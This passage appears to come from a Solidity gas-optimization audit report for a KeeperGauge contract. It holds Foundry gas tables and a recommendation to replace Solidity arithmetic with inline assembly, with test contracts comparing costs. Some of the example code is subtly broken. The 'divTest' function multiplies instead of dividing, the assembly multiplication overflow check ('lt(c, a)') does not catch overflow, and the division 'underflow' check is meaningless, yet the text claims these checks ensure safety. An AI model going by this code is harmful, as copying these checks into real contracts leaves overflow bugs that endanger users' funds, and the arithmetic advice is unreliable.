\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract2 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 35887              \u2506 210             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 uncheckedPlusPlusI \u2506 1329            \u2506 1329 \u2506 1329   \u2506 1329 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract4 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 26881              \u2506 164             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 inlineAssemblyLoop \u2506 709             \u2506 709 \u2506 709    \u2506 709 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ```  ### Lines  - KeeperGauge.sol:59  - KeeperGauge.sol:98  ---  ## Use assembly for math (add, sub, mul, div)  Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;     Contract5 c5;     Contract6 c6;     Contract7 c7;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();         c5 = new Contract5();         c6 = new Contract6();         c7 = new Contract7();     }      function testGas() public {         c0.addTest(34598345, 100);         c1.addAssemblyTest(34598345, 100);         c2.subTest(34598345, 100);         c3.subAssemblyTest(34598345, 100);         c4.mulTest(34598345, 100);         c5.mulAssemblyTest(34598345, 100);         c6.divTest(34598345, 100);         c7.divAssemblyTest(34598345, 100);     } }  contract Contract0 {     //addition in Solidity     function addTest(uint256 a, uint256 b) public pure {         uint256 c = a + b;     } }  contract Contract1 {     //addition in assembly     function addAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := add(a, b)              if lt(c, a) {                 mstore(0x00, \"overflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract2 {     //subtraction in Solidity     function subTest(uint256 a, uint256 b) public pure {         uint256 c = a - b;     } }  contract Contract3 {     //subtraction in assembly     function subAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := sub(a, b)              if gt(c, a) {                 mstore(0x00, \"underflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //multiplication in Solidity     function mulTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract5 {     //multiplication in assembly     function mulAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := mul(a, b)              if lt(c, a) {                 mstore(0x00, \"overflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract6 {     //division in Solidity     function divTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract7 {     //division in assembly     function divAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := div(a, b)              if gt(c, a) {                 mstore(0x00, \"underflow\")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js  \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 40493              \u2506 233             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 addTest            \u2506 303             \u2506 303 \u2506 303    \u2506 303 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37087              \u2506 216             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 addAssemblyTest    \u2506 263             \u2506 263 \u2506 263    \u2506 263 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract2 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 40293              \u2506 232             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 subTest            \u2506 300             \u2506 300 \u2506 300    \u2506 300 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract3 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37287              \u2506 217             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 subAssemblyTest    \u2506 263             \u2506 263 \u2506 263    \u2506 263 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract4 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 41893              \u2506 240             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 mulTest            \u2506 325             \u2506 325 \u2506 325    \u2506 325 \u2506 1       \u2502 